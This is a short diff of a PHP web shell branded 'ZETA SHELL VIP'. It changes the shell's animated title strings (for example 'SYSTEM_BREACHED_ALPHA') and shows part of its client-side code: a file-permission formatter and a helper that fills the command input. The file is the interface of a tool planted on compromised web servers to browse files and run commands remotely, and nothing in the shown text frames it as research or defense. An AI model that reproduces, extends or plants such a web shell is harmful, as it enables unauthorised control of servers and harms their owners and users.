@@ -1,3 +1,4 @@
+
 <?php
 // !!!!! HATA AYIKLAMA AÇIK - Çalışırsa sonra kapat !!!!!
 error_reporting(E_ALL);
@@ -218,7 +219,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     </div> <!-- container-fluid sonu -->
     <script>
         // --- Shell JavaScript ---
-        var typed = new Typed('#shell-title', { strings: ['ZETA SHELL VIP <?php echo $SHELL_VERSION; ?>', 'SYSTEM_BREACHED_ALPHA', 'BEROFC_ONLINE', 'AWAITING_KAOS...^1000'], typeSpeed: 40, backSpeed: 25, loop: true, showCursor: true, cursorChar: '█', smartBackspace: true });
+        var typed = new Typed('#shell-title', { strings: ['ZETA SHELL VIP <?php echo $SHELL_VERSION; ?>', 'SYSTEM_BREACHED_ALPHA', 'HENCAN', 'Tolong Kaki Saya Sakit...^1000'], typeSpeed: 40, backSpeed: 25, loop: true, showCursor: true, cursorChar: '█', smartBackspace: true });
         function perms_to_string_js(permsOctalStr) { /* ... JS perms kodu ... */ if (!permsOctalStr || permsOctalStr === '????') return 'Unknown'; const perms = parseInt(permsOctalStr, 8); if (isNaN(perms)) return 'Invalid'; let info = ''; if ((perms & 0xC000) === 0xC000) { info = 's'; } else if ((perms & 0xA000) === 0xA000) { info = 'l'; } else if ((perms & 0x8000) === 0x8000) { info = '-'; } else if ((perms & 0x6000) === 0x6000) { info = 'b'; } else if ((perms & 0x4000) === 0x4000) { info = 'd'; } else if ((perms & 0x2000) === 0x2000) { info = 'c'; } else if ((perms & 0x1000) === 0x1000) { info = 'p'; } else { info = 'u'; } info += ((perms & 0x0100) ? 'r' : '-'); info += ((perms & 0x0080) ? 'w' : '-'); info += ((perms & 0x0040) ? ((perms & 0x0800) ? 's' : 'x' ) : ((perms & 0x0800) ? 'S' : '-')); info += ((perms & 0x0020) ? 'r' : '-'); info += ((perms & 0x0010) ? 'w' : '-'); info += ((perms & 0x0008) ? ((perms & 0x0400) ? 's' : 'x' ) : ((perms & 0x0400) ? 'S' : '-')); info += ((perms & 0x0004) ? 'r' : '-'); info += ((perms & 0x0002) ? 'w' : '-'); info += ((perms & 0x0001) ? ((perms & 0x0200) ? 't' : 'x' ) : ((perms & 0x0200) ? 'T' : '-')); return info; }
         document.querySelectorAll('.perms').forEach(el => { el.title = perms_to_string_js(el.textContent); });
         function setCmd(cmd) { document.getElementById('command_input').value = cmd; }
